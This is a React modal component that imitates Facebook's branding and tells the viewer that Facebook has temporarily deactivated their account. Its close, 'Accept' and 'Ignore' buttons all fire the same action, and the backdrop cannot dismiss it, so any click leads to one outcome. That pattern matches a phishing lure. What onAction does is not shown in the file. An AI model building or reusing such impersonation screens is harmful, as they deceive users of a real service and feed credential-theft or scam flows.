'use client';

import React from 'react';

interface ModalProps {
  isOpen: boolean;
  onAction: () => void;
}

export default function Modal({ isOpen, onAction }: ModalProps) {
  if (!isOpen) return null;

  return (
    <div 
      className="fixed inset-0 z-[100] flex items-center justify-center modal-animate"
    >
      {/* Backdrop - clicking does NOT close the modal */}
      <div className="absolute inset-0 bg-black/50 backdrop-blur-sm opacity-60"></div>
      
      {/* Modal Content */}
      <div 
        className="relative bg-white rounded-2xl shadow-2xl w-full max-w-md mx-4 modal-content-animate"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Close Button */}
        <button 
          onClick={onAction}
          className="absolute right-4 top-4 w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition text-gray-500"
        >
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        {/* Modal Body */}
        <div className="p-8 text-center">
          {/* Logo - Facebook style */}
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 bg-[#1877F2] rounded-full flex items-center justify-center">
              <svg className="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
            </div>
          </div>
          <h1 className="text-3xl font-bold text-[#1877F2] mb-6 tracking-tight">facebook</h1>
          
          {/* Message */}
          <p className="text-gray-700 text-lg mb-8">
            Facebook has temporarily deactivated your account.
          </p>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-4">
            <button 
              onClick={onAction}
              className="px-8 py-3 text-gray-700 font-medium hover:bg-gray-100 rounded-lg transition"
            >
              Accept
            </button>
            <button 
              onClick={onAction}
              className="px-8 py-3 bg-gray-100 text-gray-600 font-medium rounded-lg hover:bg-gray-200 transition"
            >
              Ignore
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
